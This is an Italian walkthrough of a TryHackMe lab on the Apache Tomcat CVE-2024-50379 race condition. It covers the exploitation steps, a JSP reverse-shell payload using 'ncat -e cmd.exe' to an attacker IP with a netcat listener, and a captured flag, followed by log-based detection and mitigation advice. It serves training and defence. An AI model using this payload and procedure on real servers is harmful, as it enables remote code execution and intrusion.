
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/tomcatcve202450379

Apache Tomcat è un server web open source e un contenitore servlet . Se non hai familiarità con il termine, un **servlet** è una classe Java creata per essere eseguita su un server applicativo e gestire le richieste del client. Riceve la richiesta HTTP del client , la elabora e genera la risposta appropriata. Un **contenitore** **servlet** fornisce l'ambiente di runtime per i servlet Java e ne gestisce il ciclo di vita.

Questa sala è dedicata a una recente vulnerabilità di Tomcat, [CVE -2024-50379](https://nvd.nist.gov/vuln/detail/CVE-2024-50379) , che ha un impatto sulle seguenti versioni di Apache Tomcat:

- Apache Tomcat 11.0.0-M1 a 11.0.1 (corretto in 11.0.2 o versioni successive)
- Apache Tomcat 10.1.0-M1 a 10.1.33 (corretto in 10.1.34 o versioni successive)
- Apache Tomcat 9.0.0.M1 a 9.0.97 (corretto in 9.0.98 o versioni successive)

La CVE -2024-50379 è un esempio di vulnerabilità Time-of-check Time-of-use (TOCTOU). Una vulnerabilità TOCTOU nasce da una condizione di gara tra il controllo di una risorsa e il suo utilizzo. In altre parole, dopo che un sistema verifica lo stato di una risorsa e prima di utilizzarla, la risorsa cambia e il sistema termina di utilizzare la risorsa modificata. In questa vulnerabilità, la condizione di gara TOCTOU si verifica durante la compilazione JSP (Java Server Page) su sistemi non sensibili alle maiuscole e minuscole, a condizione che il servlet predefinito abbia permessi di scrittura.

#### Obiettivi di apprendimento

In questa sala tratteremo i seguenti argomenti:

- Cos'è un TOCTOU e come può essere sfruttato
- Sfruttamento di una versione vulnerabile di Tomcat
- Rilevare tale sfruttamento
- Proteggere la tua installazione

Rispondi alle domande qui sotto

Qual è l'acronimo di Time-of-check Time-of-use?
```
TOCTOU
```

Innanzitutto, il server consente agli utenti di caricare ed eliminare file, ovvero il server è configurato per accettare comandi HTTP come PUT e DELETE. La scrittura è abilitata impostando `readonly`su `false`nel `web.xml`file di configurazione. Nota che la configurazione predefinita è di sola lettura.

```xml
<init-param>
  <param-name>readonly</param-name>
  <param-value>false</param-value>
</init-param>
```

Di seguito è riportato un esempio di configurazione non sicura in cui il server applicativo è impostato per consentire la scrittura per impostazione predefinita.

```xml
<servlet>
  <servlet-name>default</servlet-name>
  <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
  <init-param>
    <param-name>debug</param-name>
    <param-value>0</param-value>
  </init-param>
  <init-param>
    <param-name>listings</param-name>
    <param-value>false</param-value>
  </init-param>
  <init-param>
    <param-name>readonly</param-name>
    <param-value>false</param-value>
  </init-param>
  <load-on-startup>1</load-on-startup>
</servlet>
```

La seconda condizione per sfruttare questa vulnerabilità è che Tomcat venga eseguito su un sistema che non fa distinzione tra maiuscole e minuscole, come MS Windows o macOS. Quando queste due condizioni sono soddisfatte, sfruttare questa vulnerabilità è una questione di corsa con il sistema operativo .

Nei sistemi case-sensitive come Linux , `demo.jsp`e `demo.Jsp`sono due file diversi. Di conseguenza, su un sistema Linux, non è impossibile vedere `documents`e `Documents`coesistere nella stessa directory.

Poiché il sistema MS Windows è insensibile alle maiuscole e alle minuscole `demo.jsp`e `demo.Jsp`non può essere costituito da due file diversi; tuttavia, per Tomcat, il primo è un servlet che può essere eseguito, mentre il secondo è trattato come un file di testo. In altre parole, MS Windows `demo.Jsp`non tratterebbe diversamente da come tratterebbe un servlet correttamente denominato `demo.jsp`; è il controllo della distinzione tra maiuscole e minuscole di Tomcat che impedirà `demo.Jsp`l'esecuzione e impedirà di trattarlo come un file eseguibile.

Se proviamo a creare il file `demo.jsp`, ad esempio, using `curl -X PUT -d "test" http://10.10.191.41:8080/demo.jsp`  produrrà un errore. Questo errore è previsto poiché i servlet possono eseguire comandi sul lato server; pertanto, consentire agli utenti di caricare `.jsp`file fornisce loro la capacità di esecuzione di codice remoto ( RCE ). Nel terminale sottostante, vediamo un errore di esempio.

Terminale AttackBox

```shell-session
root@tryhackme:~# curl -X PUT -d "test" http://10.10.191.41:8080/demo.jsp
<!doctype html><html lang="en"><head><title>HTTP Status 404 – Not Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1><hr class="line" /><p><b>Type</b> Status Report</p><p><b>Message</b> JSP file [&#47;demo.jsp] not found</p><p><b>Description</b> The origin server did not find a current representation for the target resource or is not willing to disclose that one exists.</p><hr class="line" /><h3>Apache Tomcat/10.1.30</h3></body></html>
```

Creiamo un file con estensione `Jsp`o `JSP`. Questo passaggio dovrebbe funzionare correttamente, poiché Tomcat non vede tali estensioni come eseguibili. Possiamo vedere che il `demo.Jsp`file è stato creato correttamente sul server.


```
curl -X PUT -d "test" http://10.10.191.41:8080/demo.Jsp
```

```
curl http://10.10.191.41:8080/demo.Jsp
```
```
test
```

Se proviamo ad accedere a `demo.Jsp`, un sistema non sensibile alle maiuscole/minuscole non lo vedrà in modo diverso da `demo.jsp`, ma la sensibilità alle maiuscole/minuscole di Tomcat ispezionerà l'estensione e la tratterà come un file di testo. È dimostrato che quando il server è sotto carico pesante, diventa possibile una condizione di competizione. `demo.Jsp`Potrebbe essere compilato ed eseguito come servlet. Poiché è un sistema non sensibile alle maiuscole/minuscole, l'applicazione dei vincoli sull'estensione servlet, come `Jsp`e `JSP`, è passata dal sistema operativo al server applicativo. In altre parole, quando un sistema è sotto carico e c'è una lettura e una scrittura simultanee dello stesso file, i controlli sulla sensibilità alle maiuscole/minuscole potrebbero essere ignorati, con conseguente esecuzione del file caricato come servlet.

Un server Tomcat è in ascolto su 10.10.191.41 sulla porta 8080. Qual è la sua versione?

```
http://10.10.191.41:8080/
```
```
10.1.25
```

Ci siamo imbattuti in diversi exploit PoC (Proof of Concept), uno dei quali è [questo](https://github.com/iSee857/CVE-2024-50379-PoC) . Puoi scaricarlo su AttackBox usando il seguente comando:

```
git clone https://github.com/iSee857/CVE-2024-50379-PoC
```

Apporteremo due modifiche a questo script:

- **Modificare il contatore dei cicli** : in questo ambiente di laboratorio, utilizzando AttackBox e una VM di destinazione , abbiamo notato che ripetere ciascuna delle quattro richieste 2000 volte anziché 10000 era più efficiente.
- **Cambia il payload** : per uno sfruttamento più interessante, useremo una shell inversa invece di avviare la calcolatrice sul sistema di destinazione.
- **Nota** : consigliamo di utilizzare AttackBox sui sistemi di attacco locali connessi tramite VPN , poiché AttackBox garantisce una latenza minima.


**Modifica del contatore del ciclo**

Il codice PoC originale ripete il `for`ciclo 10000 volte nella riga 43. Per una migliore esperienza utente e risultati efficienti, consigliamo di abbassare il numero a 2000. La riga aggiornata è mostrata di seguito:

```
ls
```

```
cd CVE-2024-50379-PoC
```

```
nano ApachTomcat_CVE-2024-50379_ConditionalCompetitionToRce.py
```

```python
for _ in range(2000):
```

**Nota:** tieni presente che questa modifica si applica solo all'AttackBox. Sebbene consigliamo di utilizzare l'AttackBox per questa stanza, tieni presente che la tua VM potrebbe aver bisogno di un numero diverso.

**Modifica del carico utile**

Questo exploit PoC utilizza un payload che apre `calc.exe`, come si può dedurre dalla riga 37. Per semplificare questo exploit, abbiamo installato `ncat`sul server MS Windows. Pertanto, sostituiremo il payload con un altro che si collega al sistema dell'attaccante. Il payload commentato e quello nuovo sono mostrati di seguito.

```python
-# payload_put = "aa<% Runtime.getRuntime().exec(\"calc.exe\");%>"
payload_put = "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c start ncat -e cmd.exe 10.10.194.219 8888\"); %>"
```

Questo payload usa JSP `Runtime.getRuntime().exec()`per eseguire `cmd /c start ncat -e cmd.exe 10.10.194.219 8888`. Come detto, questo è possibile perché abbiamo installato `ncat`per lo scopo di questa dimostrazione.

Prima di eseguire questo PoC , dobbiamo ascoltare le connessioni in arrivo. Iniziamo `netcat`con AttackBox usando `netcat -lvnp 8888`.

```
netcat -lvnp 8888
```

Successivamente, su AttackBox, eseguiamo l'exploit con il comando `python3 ApachTomcat_CVE-2024-50379_ConditionalCompetitionToRce.py -u 10.10.191.41:8080`.

- **Nota 1:** l'esecuzione di questo comando visualizzerà un messaggio come `Checking http://10.10.191.41:8080/...`, e il terminale smetterà di mostrare gli aggiornamenti per alcuni minuti. Durante questo periodo, il codice exploit invia molte richieste per sovraccaricare il server di destinazione e produrre con successo una condizione di gara. Attendi mentre lo script viene eseguito mentre osservi il terminale che esegue il `netcat -lvnp 8888`comando. La pazienza è la chiave.
- **Nota 2:** poiché si tratta di un exploit di condizione di gara, potrebbe essere necessario ripetere il PoC più volte prima di riuscire.

Quando l'exploit riesce, verrà stabilita una connessione con l'ascolto `netcat`. Il terminale qui sotto mostra un esempio.

Terminale AttackBox

```shell-session
root@tryhackme:~# netcat -lvnp 8888
Listening on 0.0.0.0 8888

Connection received on 10.10.235.214 50916
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 10.1>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 10.1

01/30/2025  08:14 AM    <DIR>          .
01/30/2025  08:14 AM    <DIR>          ..
01/30/2025  08:14 AM    <DIR>          bin
[...]
01/30/2025  08:15 AM    <DIR>          work
               5 File(s)        180,180 bytes
               9 Dir(s)  14,243,995,648 bytes free

C:\Program Files\Apache Software Foundation\Tomcat 10.1>
```

Rispondi alle domande qui sotto

Qual è il contenuto del `flag.txt`file sull'unità `C:\`?

```
cd c:/
```

```
c:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\

11/14/2018  06:56 AM    <DIR>          EFI
01/30/2025  10:57 AM                13 flag.txt
05/13/2020  05:58 PM    <DIR>          PerfLogs
01/30/2025  08:09 AM    <DIR>          Program Files
01/30/2025  09:17 AM    <DIR>          Program Files (x86)
03/17/2021  03:00 PM    <DIR>          Users
03/17/2021  02:59 PM    <DIR>          Windows
               1 File(s)             13 bytes
               6 Dir(s)  13,911,683,072 bytes free

```

```
type flag.txt
```
```
type flag.txt
THM{M9bN6cF3}
```

#### Rilevamento - Registri di accesso Web

Poiché la vulnerabilità si basa sul successo di una condizione di gara e richiede il caricamento di file per ogni tentativo di sfruttamento, è facile da rilevare nei log di accesso Web, disponibili di default nei `C:\Program Files\Apache Software Foundation\<Tomcat Version>\logs\*access_log*`file. L'attacco più semplice ai siti Web con caricamento di file senza restrizioni verrà registrato come segue:

1. **PUT** richiede di caricare il file con estensione maiuscola ( **.Jsp** o **.JSP**`"PUT /cve.Jsp"` ) ( )
2. **Richiesta GET** allo stesso file subito dopo, ma ora all'estensione **.jsp** ( `"GET /cve.jsp"`)
3. **La richiesta GET** viene registrata con il codice di stato **200** o **404** , a seconda che la condizione di gara sia riuscita o meno
4. I passaggi sopra indicati vengono ripetuti finché la condizione di gara non ha successo; di solito, si tratta di 1000 o più tentativi

```http
10.14.97.15 - - [30/Jan/2025:14:25:34 +0000] "PUT /cve.Jsp HTTP/1.1" 201 -
10.14.97.15 - - [30/Jan/2025:14:25:34 +0000] "GET /cve.jsp HTTP/1.1" 404 749
...
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "PUT /cve.Jsp HTTP/1.1" 409 654
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "GET /cve.jsp HTTP/1.1" 404 749
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "PUT /cve.Jsp HTTP/1.1" 204 -
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "GET /cve.jsp HTTP/1.1" 404 749
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "PUT /cve.Jsp HTTP/1.1" 204 -
10.14.97.15 - - [30/Jan/2025:14:25:39 +0000] "GET /cve.jsp HTTP/1.1" 200 32
```

Supponiamo che il server web preso di mira non consenta il caricamento diretto dei file tramite PUT ma abbia comunque alcune capacità di caricamento web (come la funzionalità di caricamento di immagini o file). In tal caso, l'attacco avrà un modello iterativo simile: una richiesta sul modulo di caricamento web seguita dalla richiesta sul file JSP dannoso caricato:

```http
223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] "POST /app/template-upload.jsp HTTP/1.1" 200 782
223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] "GET /uploads/revshell.jsp HTTP/1.1" 404 749
223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] "POST /app/template-upload.jsp HTTP/1.1" 200 782
223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] "GET /uploads/revshell.jsp HTTP/1.1" 404 749
...
223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] "POST /app/template-upload.jsp HTTP/1.1" 200 782
223.199.178.14 - - [31/Jan/2025:18:32:11 +0000] "GET /uploads/revshell.jsp HTTP/1.1" 200 32
```

#### Rilevamento - Registri di sistema

Oltre ai rilevamenti basati sul Web, l'attacco può essere tracciato a livello di sistema operativo e file system utilizzando i registri eventi predefiniti di Windows o strumenti specializzati come Sysmon . In breve, il rilevamento può essere costruito attorno a:

- **Creazione file** : i file JSP caricati rimangono all'interno della directory radice web a meno che gli autori della minaccia non li rimuovano manualmente. Qualsiasi file JSP dal nome sospetto come `revshell.jsp`o file JSP non riconosciuti contenenti stringhe come `.exec()`possono indicare l'attacco.
- **Esecuzione del processo** : i file JSP caricati di solito devono generare un processo figlio per ottenere l'esecuzione del codice. Su Windows, vedere Apache Tomcat generare un processo CMD o PowerShell potrebbe essere un altro indicatore di attacco affidabile.

#### mitigazione

È essenziale controllare se hai abilitato la scrittura per i servlet. Se la configurazione predefinita è mantenuta così com'è, ovvero  `readonly`non è impostata su `false`, allora non sei interessato. Se è impostata su `false`e non è richiesta per il tuo caso d'uso, allora reimpostala su `true`.

I passaggi di mitigazione sono delineati in questo [annuncio ufficiale](https://lists.apache.org/thread/b2b9qrgjrz1kvo4ym8y2wkfdvwoq6qbp) . Ci sono due punti principali che gli utenti dovrebbero considerare. Innanzitutto, gli utenti dovrebbero aggiornare la loro installazione di Apache Tomcat. In particolare:

- Gli utenti di Apache Tomcat dalla versione 11.0.0-M1 alla 11.0.1 dovrebbero effettuare l'aggiornamento alla **versione 11.0.3** o successiva.
- Gli utenti di Apache Tomcat dalla versione 10.1.0-M1 alla versione 10.1.33 dovrebbero effettuare l'aggiornamento alla **versione 10.1.35** o successiva.
- Gli utenti di Apache Tomcat dalla versione 9.0.0.M1 alla 9.0.97 dovrebbero effettuare l'aggiornamento alla **versione 9.0.99** o successiva.

Sono richiesti passaggi aggiuntivi per gli utenti che hanno effettuato solo l'aggiornamento a 11.0.2, 10.1.34 o 9.98. In particolare, gli utenti di versioni precedenti di Java dovrebbero apportare le modifiche esplicite pertinenti:

- Nei sistemi che utilizzano Java 8 o Java 11, il `sun.io.useCanonCaches`valore predefinito della proprietà di sistema deve essere modificato e impostato su `false`.
- Nei sistemi che utilizzano Java 17, la proprietà di sistema `sun.io.useCanonCaches`dovrebbe essere ripristinata `false`se il suo valore predefinito è stato modificato.

È opportuno notare che Tomcat 11.0.3, 10.1.35, 9.0.99 e versioni successive includono controlli per garantire che `sun.io.useCanonCaches`sia impostato correttamente.


